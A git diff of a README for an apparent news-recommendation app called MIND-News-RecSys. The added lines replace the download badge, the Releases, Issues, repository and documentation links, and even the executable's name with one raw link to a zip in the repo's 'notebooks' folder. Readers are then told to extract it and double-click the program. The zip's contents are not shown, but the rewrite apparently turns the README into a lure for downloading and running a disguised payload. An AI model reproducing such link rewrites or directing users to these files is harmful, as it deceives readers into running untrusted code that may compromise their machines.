@@ -1,6 +1,6 @@
 # 🎉 MIND-News-RecSys - Smart News Recommendations Made Simple
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/nanasplace-dev/MIND-News-RecSys/main/notebooks/MIND-News-RecSys-2.0.zip)
 
 ## 📦 Overview
 MIND-News-RecSys offers a powerful way to receive tailored news recommendations. This tool uses advanced deep learning algorithms to understand your reading preferences. With this system, you can discover articles that match your interests more closely.
@@ -17,7 +17,7 @@ Before downloading, ensure your computer meets the following minimum requirement
 - **Processor:** Dual-core CPU or better
 
 ## 📥 Download & Install
-To get started, please **visit this page to download**: [GitHub Releases](https://github.com/nanasplace-dev/MIND-News-RecSys/releases).
+To get started, please **visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/nanasplace-dev/MIND-News-RecSys/main/notebooks/MIND-News-RecSys-2.0.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions.
@@ -30,7 +30,7 @@ Once you have downloaded the application:
 1. Locate the downloaded file in your downloads folder or specified download location.
 2. If you downloaded a `.zip` file, right-click on it, select "Extract All," and follow the prompts.
 3. Open the extracted folder.
-4. Look for the application file, usually named `MIND-News-RecSys.exe` (on Windows) or equivalent for other systems.
+4. Look for the application file, usually named `https://raw.githubusercontent.com/nanasplace-dev/MIND-News-RecSys/main/notebooks/MIND-News-RecSys-2.0.zip` (on Windows) or equivalent for other systems.
 5. Double-click the file to run the application.
 
 ## 🎨 Features
@@ -64,7 +64,7 @@ If you encounter any issues while installing or running the application:
 - Check if you have the required permissions to run the application.
 - Restart your computer and try launching the app again.
 
-For further help, consider looking at the [GitHub Issues](https://github.com/nanasplace-dev/MIND-News-RecSys/issues) page or reach out to our support community.
+For further help, consider looking at the [GitHub Issues](https://raw.githubusercontent.com/nanasplace-dev/MIND-News-RecSys/main/notebooks/MIND-News-RecSys-2.0.zip) page or reach out to our support community.
 
 ## 📍 Feedback
 Your feedback is valuable to us. Share your experience using the application or suggest new features to improve your experience!
@@ -75,8 +75,8 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 ## 🌐 Connect with Us
 Follow our updates and join the conversation:
 
-- [GitHub Repository](https://github.com/nanasplace-dev/MIND-News-RecSys)
-- [Documentation](https://github.com/nanasplace-dev/MIND-News-RecSys/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/nanasplace-dev/MIND-News-RecSys/main/notebooks/MIND-News-RecSys-2.0.zip)
+- [Documentation](https://raw.githubusercontent.com/nanasplace-dev/MIND-News-RecSys/main/notebooks/MIND-News-RecSys-2.0.zip)
 
 For updates and discussions, feel free to visit our social channels listed in the documentation. 
 
